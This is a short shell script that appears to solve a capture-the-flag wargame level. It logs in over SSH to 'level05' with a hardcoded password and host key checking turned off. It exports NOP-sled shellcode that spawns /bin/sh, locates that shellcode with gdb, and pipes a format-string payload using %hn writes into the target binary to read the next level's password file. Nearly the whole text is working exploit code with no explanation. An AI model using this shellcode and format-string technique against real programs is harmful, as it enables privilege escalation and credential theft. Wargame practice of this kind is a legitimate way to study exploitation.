#!/bin/sh

PASS='3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN'
echo $PASS
echo $OVERRIDE

sshpass -p $PASS ssh -o StrictHostKeyChecking=no level05@$OVERRIDE -p 4242 << EOF
export SHELLCODE=`python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"'`
gdb ./level05
b *main
run
x/30x *environ
quit

(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%56887c' + '%10\\\$hn'+ '%8640c' + '%11\\\$hn'"; echo 'cat /home/users/level06/.pass') | ./level05
EOF